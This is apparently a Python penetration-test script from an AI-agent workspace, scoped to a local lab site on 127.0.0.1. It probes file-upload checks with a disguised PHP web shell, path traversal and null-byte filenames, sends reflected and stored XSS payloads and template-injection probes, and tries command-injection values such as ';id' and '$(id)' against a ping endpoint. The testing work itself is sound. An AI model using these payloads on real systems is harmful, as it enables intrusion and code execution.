"""t4-C：文件上传 / XSS / RCE(命令注入) 测试。仅 127.0.0.1:8095、8091。"""
import json
import os
import sys
import importlib.util as ilu

HERE = os.path.dirname(os.path.abspath(__file__))
spec = ilu.spec_from_file_location("hunt_lib", os.path.join(HERE, "hunt-lib.py"))
lib = ilu.module_from_spec(spec)
spec.loader.exec_module(lib)

BASE = r"C:\Users\Administrator\Documents\deepseek-harness\default-workspace"
UPLOADS = os.path.join(BASE, "target-site-lab", "uploads")
OUT = os.path.join(HERE, "hunt-c-upload-xss-rce-20261012-1845.json")
rec = []
res = []
UPLOAD_SCAN = []   # 上传目录落地文件审计


def add(cat, title, detail, idxs, impact, verdict="见 detail", needs_verify=True,
        port=8095):
    res.append({"id": f"HUNT-C{len(res)+1}", "port": port, "category": cat,
                "title": title, "verdict": verdict, "evidence_indices": idxs,
                "detail": detail, "self_assessed_impact": impact,
                "needs_verifier": needs_verify})


def ls_uploads():
    out = []
    if os.path.isdir(UPLOADS):
        for n in sorted(os.listdir(UPLOADS)):
            p = os.path.join(UPLOADS, n)
            out.append({"name": n, "size": os.path.getsize(p) if os.path.isfile(p) else None,
                        "isdir": os.path.isdir(p)})
    return out


def multipart(fields, filename="a.txt", content=b"hello", fieldname="file"):
    b = "----huntboundary1234567890"
    parts = []
    parts.append(f"--{b}\r\nContent-Disposition: form-data; name=\"{fieldname}\";"
                 f" filename=\"{filename}\"\r\nContent-Type: application/octet-stream"
                 "\r\n\r\n".encode())
    parts.append(content)
    parts.append(f"\r\n--{b}--\r\n".encode())
    body = b"".join(parts)
    return b, body


# 先确保上传目录初始为空
print("uploads before:", ls_uploads())

cases = [
    ("正常 txt", "ok.txt", b"hello world this is a text file\n", None),
    ("空 txt", "empty.txt", b"", None),
    ("png 魔数+PHP", "shell.png", b"\x89PNG\r\n\x1a\n<?php system($_GET['c']); ?>", None),
    ("png 魔数+HTML", "x.png", b"\x89PNG\r\n\x1a\n<script>alert(1)</script>", None),
    ("jpg 魔数+JS", "x.jpg", b"\xff\xd8\xff\xff<script>alert(1)</script>", None),
    ("后缀大写 PNG", "up.PNG", b"\x89PNG\r\n\x1a\nAAAA", None),
    ("双后缀 .png.php", "d.png.php", b"\x89PNG\r\n\x1a\n<?php ?>", None),
    ("双后缀 .php.png", "d.php.png", b"\x89PNG\r\n\x1a\n<?php ?>", None),
    ("后缀空", "noext", b"\x89PNG\r\n\x1a\nAAAA", None),
    ("路径穿越 ../trav.txt", "../trav.txt", b"traversal test\n", None),
    ("路径穿越 ..\\trav2.txt", "..\\trav2.txt", b"traversal test 2\n", None),
    ("绝对路径 C:\\Windows\\Temp\\abs.txt", "C:\\Windows\\Temp\\abs.txt", b"abs\n", None),
    ("空字节截断 shell.jsp%00.png", "shell.jsp\x00.png", b"\x89PNG\r\n\x1a\nAA", None),
    ("隐藏文件 .htaccess", ".htaccess", b"\x89PNG\r\n\x1a\n", None),
    ("Windows 设备名 CON.txt", "CON.txt", b"device name test\n", None),
    ("超长文件名(300)", "a" * 296 + ".txt", b"long name\n", None),
    ("txt 但二进制内容", "bin.txt", bytes(range(0, 256)), None),
    ("txt 含控制字符 50%", "ctrl.txt", (b"A" * 100 + b"\x00" * 100), None),
    ("jpeg 后缀(不在白名单)", "x.jpeg", b"\xff\xd8\xff\xff", None),
    ("svg(不在白名单)", "x.svg", b"<svg onload=alert(1)>", None),
    ("php(不在白名单)", "x.php", b"<?php echo 1; ?>", None),
]

for name, fn, content, _ in cases:
    b, body = multipart({}, filename=fn, content=content)
    k = lib.sent(rec, "POST", "/upload", headers={
        "Content-Type": f"multipart/form-data; boundary={b}",
        "Content-Length": str(len(body)),
    }, body=body, note=f"C1 上传用例：{name} (filename={fn[:40]!r})")
    r = rec[k]
    title = r["response_body"].split("<title>")[1].split("</title>")[0] \
        if "<title>" in r["response_body"] else ""
    UPLOAD_SCAN.append({"case": name, "filename": fn[:60], "status": lib.get_status(r),
                        "title": title, "idx": k,
                        "snippet": lib.head_text(r, 200)})

add("文件上传", "8095 匿名上传面：扩展名白名单/魔数校验/文件名清洗 组合用例（21 组）",
    json.dumps(UPLOAD_SCAN, ensure_ascii=False),
    [c["idx"] for c in UPLOAD_SCAN],
    "若任一用例把非白名单后缀（.php/.htaccess/.svg）写入 uploads/ 或以目录外路径落盘，"
    "即上传绕过；即使落盘，/uploads/ 以 octet-stream+attachment+nosniff 返回，浏览器不执行",
    port=8095)

after = ls_uploads()
print("uploads after:", after)
landed = [f["name"] for f in after]
suspicious = [f for f in landed if not f.lower().endswith((".jpg", ".png", ".txt"))]

# 判定：是否有非白名单文件落地 / 是否落到目录外
extra = {
    "uploads_before": [],
    "uploads_after": after,
    "landed": landed,
    "non_whitelist_landed": suspicious,
    "traversal_outside": [p for p in
                          ("trav.txt", "trav2.txt", "C:\\Windows\\Temp\\abs.txt")
                          if os.path.exists(os.path.join(BASE, p))
                          or os.path.exists(p)],
    "title_distribution": {t: sum(1 for c in UPLOAD_SCAN if c["title"] == t)
                           for t in {c["title"] for c in UPLOAD_SCAN}},
}
add("文件上传", "上传目录落地审计（白名单外文件 / 目录外落地 / 覆写）",
    json.dumps(extra, ensure_ascii=False), [c["idx"] for c in UPLOAD_SCAN],
    "白名单外文件落地即上传校验绕过；本项给出目录级证据",
    verdict="见 detail", port=8095)

# 上传文件的可访问性/执行面：/uploads/<name>
acc = []
for f in after:
    k = lib.sent(rec, "GET", "/uploads/" + f["name"], note=f"C2 访问 {f['name']}")
    r = rec[k]
    ct = [v for kk, v in r["response_headers"] if kk.lower() == "content-type"]
    disp = [v for kk, v in r["response_headers"] if kk.lower() == "content-disposition"]
    nosniff = [v for kk, v in r["response_headers"] if kk.lower() == "x-content-type-options"]
    acc.append({"name": f["name"], "status": lib.get_status(r),
                "content_type": ct, "content_disposition": disp, "nosniff": nosniff,
                "idx": k, "body_head": r["response_body"][:60]})
add("文件上传", "/uploads/<name> 响应头审计（Content-Type / Content-Disposition / nosniff）",
    json.dumps(acc, ensure_ascii=False), [a["idx"] for a in acc],
    "若以 text/html 返回且无 attachment，则存储型 XSS 可执行（当前实现为 octet-stream+attachment）",
    needs_verify=False, port=8095)

# ---------------- XSS 反射/存储 ----------------
xss = []
payloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    '<svg/onload=alert(1)>',
    'javascript:alert(1)',
    '<body onload=alert(1)>',
    '{{7*7}}',
    '${7*7}',
    '#{7*7}',
]
pts = [("8095", 8095, "/search?q={}", None), ("8095", 8095, "/greet?name={}", None),
       ("8095", 8095, "/api/search?q={}", None)]
for port_s, port, tpl, _ in pts:
    for p in payloads:
        from urllib.parse import quote
        path = tpl.format(quote(p, safe=""))
        k = lib.sent(rec, "GET", path, port=port, note=f"C3 XSS {path[:60]}")
        r = rec[k]
        raw = p in r["response_body"]
        escaped = ("&lt;" in r["response_body"] or "&quot;" in r["response_body"]
                   or "&#x27;" in r["response_body"] or "&#39;" in r["response_body"])
        xss.append({"target": port_s, "path": path, "payload": p,
                    "status": lib.get_status(r), "raw_reflection": raw,
                    "escaped_present": escaped, "idx": k,
                    "snippet": lib.head_text(r, 200)})
add("XSS", "8095 反射型探针：/search、/greet、/api/search × 9 payload（含 SSTI 探针 {{7*7}}）",
    json.dumps(xss, ensure_ascii=False), [x["idx"] for x in xss],
    "raw_reflection=True 且响应为 text/html 时构成 XSS；SSTI 探针若返回 49 即模板注入",
    port=8095)

# 存储型：(a) /board 留言，(b) 上传文件名回显
b, body = multipart({}, filename='<img src=x onerror=alert(1)>.txt',
                    content=b"xss file\n")
k1 = lib.sent(rec, "POST", "/upload", headers={
    "Content-Type": f"multipart/form-data; boundary={b}"}, body=body,
    note="C4 上传文件名含 XSS payload")
k2 = lib.sent(rec, "GET", "/board", note="C4 读取留言板")
mark1 = 'HUNT-C4-xss-<script>alert(1)</script>'
k3 = lib.sent(rec, "POST", "/board",
              headers={"Content-Type": "application/x-www-form-urlencoded"},
              body="content=" + mark1.replace("<", "%3C").replace(">", "%3E").replace("/", "%2F"),
              note="C4 留言板写入 XSS payload")
k4 = lib.sent(rec, "GET", "/board", note="C4 读取留言板（写入后）")
store = {
    "upload_filename_case": {"status": lib.get_status(rec[k1]),
                             "idx": k1, "body": lib.head_text(rec[k1], 300)},
    "board_after_post": {"status": lib.get_status(rec[k3]),
                         "rendered_raw_payload": mark1 in rec[k4]["response_body"],
                         "escaped": ("&lt;script&gt;" in rec[k4]["response_body"]),
                         "idx": k3, "read_idx": k4,
                         "snippet": lib.head_text(rec[k4], 300)},
}
add("XSS", "8095 存储型探针：/board 留言 XSS + 上传文件名回显 XSS",
    json.dumps(store, ensure_ascii=False), [k1, k2, k3, k4],
    "留言板输出 html.escape；上传结果页对文件名 html.escape，若 raw payload 原样出现即存储型 XSS",
    port=8095)

# ---------------- 命令注入 ---------------- 
cmd = []
hosts = ["127.0.0.1", "127.0.0.1;id", "127.0.0.1|id", "127.0.0.1&whoami",
         "127.0.0.1`id`", "$(id)", "127.0.0.1\nid", "127.0.0.1&&calc",
         "a" * 300, "-n", "127.0.0.1 -n 99", "127.0.0.1;", "127.0.0.1\x00id"]
for h in hosts:
    from urllib.parse import quote
    k = lib.sent(rec, "GET", "/ping?host=" + quote(h, safe=""),
                 transport_timeout=30, note=f"C5 ping host={h[:30]!r}")
    r = rec[k]
    cmd.append({"host": h[:40], "status": lib.get_status(r),
                "uid_leak": "uid=" in r["response_body"] or "root" in r["response_body"],
                "idx": k, "snippet": lib.head_text(r, 220),
                "elapsed_ms": r["elapsed_ms"]})
add("命令执行", "8095 /ping?host= 命令注入探针（13 组，含分隔符/换行/NUL/超长/-n 参数注入）",
    json.dumps(cmd, ensure_ascii=False), [c["idx"] for c in cmd],
    "若响应体出现命令输出（uid=/whoami 结果）即 RCE；当前实现为白名单正则 + shell=False + 参数数组",
    port=8095)

with open(OUT, "w", encoding="utf-8") as fh:
    json.dump({"generated": lib.now(), "results": res, "upload_scan": UPLOAD_SCAN,
               "upload_after": after, "raw_entries": rec}, fh,
              ensure_ascii=False, indent=1)
print("WROTE", OUT, "entries", len(rec))
for r in res:
    print("-", r["id"], "|", r["title"][:80])
